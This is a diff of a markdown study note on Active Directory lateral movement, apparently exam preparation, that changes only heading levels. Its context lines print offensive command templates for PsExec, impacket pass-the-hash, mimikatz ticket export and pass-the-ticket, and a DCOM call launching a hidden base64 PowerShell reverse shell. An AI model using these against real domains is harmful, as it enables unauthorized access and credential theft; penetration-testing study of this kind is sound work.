@@ -5,7 +5,7 @@ pagetitle: Active Directory Lateral Movement
 
 Lateral movement doesn't have to be used for different subnets. If we have credentials but lack rdp, lateral movement as a domain user is our friend
 
-### WMI and WinRM
+## WMI and WinRM
 
 **Windows Management Instrumentation**
 - Facilitates task automation via creating processes
@@ -43,7 +43,7 @@ New-PSSession -ComputerName {target} -Credential $credential
 Enter-PSSession {PSSession_ID_returned}
 ```
 
-### PsExec
+## PsExec
 - Tool used to replace telnet-like applications and provide remote execution of processes
 - From [PsTools](https://download.sysinternals.com/files/PSTools.zip)
 - Requires:
@@ -52,7 +52,7 @@ Enter-PSSession {PSSession_ID_returned}
 	- File and Printer sharing (on by default)
 - `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`
 
-### Pass the Hash (repeat from Module 16)
+## Pass the Hash (repeat from Module 16)
 - Only works for NTLM hashes (discussed in 16 - Password Attacks)
 - PsExec, Passing-the-hash toolkit, and Impacket can all pass hashes
 - SMB must be open
@@ -60,7 +60,7 @@ Enter-PSSession {PSSession_ID_returned}
 	- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` and
 	- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`
 
-### Overpass the Hash
+## Overpass the Hash
 - Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
 - Assumes we own a server that has a domain user's hash
 - This can act as `RunAs` but for a domain user's hash 
@@ -74,7 +74,7 @@ Enter-PSSession {PSSession_ID_returned}
 		- Need to be able to write to C:\Windows
 		- We can just change the local Administrator user if we have an administrative user
 
-### Pass the Ticket
+## Pass the Ticket
 - TGTs only work on the machine they're created for, whereas TGSs offer flexibility
 - Export current in-memory tickets with `sekurlsa::tickets /export`
 	- This exports all tickets in `.kirbi` format in the same file directory, ls to find the ticket names (among other info)
@@ -82,7 +82,7 @@ Enter-PSSession {PSSession_ID_returned}
 		- `kerberos::ptt {ticket_name}`
 	- If using these to access file shares, running something like `ls \\web04\` will just give an error. Type `ls \\web04\` and press tab (or just `Find-DomainShare` with PowerView)
 
-### DCOM
+## DCOM
 - Good for lateral movement
 - Exploits the Distributed Component Object Model (DCOM)
 	- Used for creating software components that interact with each other
@@ -92,10 +92,10 @@ Enter-PSSession {PSSession_ID_returned}
 	- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target_IP}"))` 
 	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`
 
-### SMB
+## SMB
 - `net view //{dnshostname or IP} /all`
 
-### Persistence
+## Persistence
 - Not exactly tested by the exam, but shells can be flaky and these can help
 
 **Golden Ticket**
